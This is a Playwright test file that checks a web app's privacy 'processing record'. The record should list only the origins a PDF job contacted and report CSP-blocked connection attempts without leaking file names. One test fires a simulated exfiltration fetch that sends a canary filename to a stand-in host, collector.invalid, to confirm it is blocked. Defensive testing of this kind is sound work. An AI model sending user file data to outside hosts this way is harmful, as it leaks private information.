import path from 'node:path';
import { expect, test, type Page, type Request } from '@playwright/test';
import { build, type Rolldown } from 'vite';

import type { ProcessingRecord } from '../lib/attestation/record';
import { testPdf } from './fixtures';

/**
 * Owner decision 15: the processing record's network section must be a real
 * measurement. This runs a real local job and compares what the record lists
 * with every request Playwright saw the page make during that job.
 *
 * The page's own record module is bundled into the app and not exposed on
 * `window` (nothing should be). So the same module is bundled here and
 * evaluated into the page before the job; it listens for the same completion
 * event and calls the same `captureProcessingRecord`, against the same
 * Resource Timing timeline and violation reports. `page.evaluate` runs through
 * the debugger, so the page's CSP does not need widening.
 */
const projectRoot = path.resolve(import.meta.dirname, '..');
const HARNESS_ID = '\0processing-record-harness';

let harnessSource: Promise<string> | undefined;
function harnessBundle() {
  harnessSource ??= (async () => {
    const recordModule = path.join(projectRoot, 'lib/attestation/record.ts');
    const output = (await build({
      configFile: false,
      logLevel: 'silent',
      publicDir: false,
      plugins: [
        {
          name: 'processing-record-harness',
          resolveId: (id) => (id === HARNESS_ID ? HARNESS_ID : undefined),
          load: (id) =>
            id === HARNESS_ID
              ? `
import { captureProcessingRecord, toJson, toText } from ${JSON.stringify(recordModule)};
window.addEventListener('tools:completion', (event) => {
  const record = captureProcessingRecord(event.detail);
  window.__processingRecordCompleted?.();
  window.__processingRecordHarness = {
    record,
    json: record && toJson(record),
    text: record && toText(record),
  };
});
`
              : undefined,
        },
      ],
      build: {
        write: false,
        minify: false,
        target: 'es2022',
        rolldownOptions: { input: HARNESS_ID, output: { format: 'iife' } },
      },
    })) as Rolldown.RolldownOutput;
    const chunk = output.output.find((item) => item.type === 'chunk');
    if (!chunk || chunk.type !== 'chunk') throw new Error('No harness chunk');
    return chunk.code;
  })();
  return harnessSource;
}

interface HarnessResult {
  record: ProcessingRecord | null;
  json: string | null;
  text: string | null;
}

async function chooseFile(
  page: Page,
  buttonName: RegExp,
  file: { name: string; mimeType: string; buffer: Buffer },
) {
  await expect(async () => {
    const chooser = page.waitForEvent('filechooser', { timeout: 2_000 });
    await page.getByRole('button', { name: buttonName }).first().click();
    await (await chooser).setFiles(file);
  }).toPass({ timeout: 45_000 });
}

test.describe('processing record', () => {
  test('lists the requests the page made during a real job, by origin only', async ({
    page,
    baseURL,
  }) => {
    test.setTimeout(180_000);
    const harness = await harnessBundle();

    await page.goto('/pdf/page-tools');
    await chooseFile(page, /choose a pdf/iu, {
      name: 'CANARY-secret-filename.pdf',
      mimeType: 'application/pdf',
      buffer: await testPdf(3),
    });
    const apply = page.getByRole('button', { name: 'Apply PDF changes' });
    await expect(apply).toBeEnabled({ timeout: 30_000 });
    await page.evaluate(harness);

    // Playwright's and the page's clocks differ, so requests are placed by
    // event order instead: "job" from the click until the completion event
    // reaches the harness (reported back through an exposed binding).
    let phase: 'before' | 'job' | 'after' = 'before';
    const duringJob: Request[] = [];
    await page.exposeFunction('__processingRecordCompleted', () => {
      phase = 'after';
    });
    page.on('request', (request) => {
      if (phase === 'job') duringJob.push(request);
    });
    const workerUrls = new Set<string>();
    page.on('worker', (worker) => workerUrls.add(worker.url()));

    phase = 'job';
    await apply.click();
    await expect(
      page.getByRole('heading', { name: /^Done — \d+ pages? ready$/u }),
    ).toBeVisible({ timeout: 60_000 });
    expect(phase).toBe('after');
    const result = (await page.evaluate(
      () =>
        (window as unknown as { __processingRecordHarness?: unknown })
          .__processingRecordHarness,
    )) as HarnessResult | undefined;
    expect(result?.record).toBeTruthy();
    const record = result!.record!;

    // Requests a worker makes itself are in the worker's own timeline, which
    // the record says it cannot see. Playwright attributes them to the page,
    // so split them out by frame.
    const fromPage = duringJob.filter((request) => {
      try {
        return request.frame() === page.mainFrame();
      } catch {
        return false;
      }
    });
    const fromWorkers = duringJob.filter(
      (request) => !fromPage.includes(request),
    );
    test.info().annotations.push({
      type: 'observed',
      description: JSON.stringify({
        durationMs: record.durationMs,
        page: fromPage.map((request) => [
          request.resourceType(),
          request.url(),
        ]),
        workers: fromWorkers.map((request) => request.url()),
        workerUrls: [...workerUrls],
        record: record.network,
      }),
    });

    expect(record.network.measured).toBe(true);
    expect(record.network.complete).toBe(true);
    expect(record.network.requestsDuringJob).toBe(fromPage.length);
    const expectedOrigins = new Map<string, number>();
    for (const request of fromPage) {
      const origin = new URL(request.url()).origin;
      expectedOrigins.set(origin, (expectedOrigins.get(origin) ?? 0) + 1);
    }
    const recordedOrigins = new Map<string, number>();
    for (const entry of record.network.origins)
      recordedOrigins.set(
        entry.origin,
        (recordedOrigins.get(entry.origin) ?? 0) + entry.count,
      );
    expect(Object.fromEntries(recordedOrigins)).toEqual(
      Object.fromEntries(expectedOrigins),
    );
    // Every request is same-origin on this route; nothing was blocked.
    expect([...recordedOrigins.keys()]).toEqual(
      fromPage.length ? [new URL(baseURL!).origin] : [],
    );
    expect(record.network.blockedAttemptsMeasured).toBe(true);
    expect(record.network.blockedAttempts).toEqual([]);

    expect(record.page).toBe('/pdf/page-tools');
    expect(record.tool.executionMode).toBe('local-js');
    for (const output of [result!.json!, result!.text!]) {
      expect(output).not.toContain('CANARY');
      expect(output).not.toContain('.pdf');
      for (const request of duringJob)
        expect(output).not.toContain(new URL(request.url()).pathname);
    }
  });

  test('reports a blocked connection attempt by directive and origin', async ({
    page,
  }) => {
    test.setTimeout(60_000);
    const harness = await harnessBundle();
    await page.goto('/pdf/page-tools');
    await page.evaluate(harness);

    // A page script's fetch to another origin is what connect-src 'none'
    // exists to stop. Dispatch a completion covering it the way a tool would.
    const result = (await page.evaluate(async () => {
      const started = performance.now();
      await fetch(
        'https://collector.invalid/upload?name=CANARY-secret-filename.pdf',
      ).catch(() => undefined);
      await new Promise((resolve) => setTimeout(resolve, 200));
      window.dispatchEvent(
        new CustomEvent('tools:completion', {
          detail: {
            operation: 'Blocked request probe',
            durationMs: performance.now() - started,
          },
        }),
      );
      return (window as unknown as { __processingRecordHarness?: unknown })
        .__processingRecordHarness;
    })) as HarnessResult;

    const record = result.record!;
    expect(record.network.blockedAttempts).toEqual([
      {
        directive: 'connect-src',
        origin: 'https://collector.invalid',
        count: 1,
      },
    ]);
    expect(result.json).not.toContain('CANARY');
    expect(result.json).not.toContain('/upload');
    expect(result.text).toContain('Blocked attempts reported to this page: 1');
  });
});
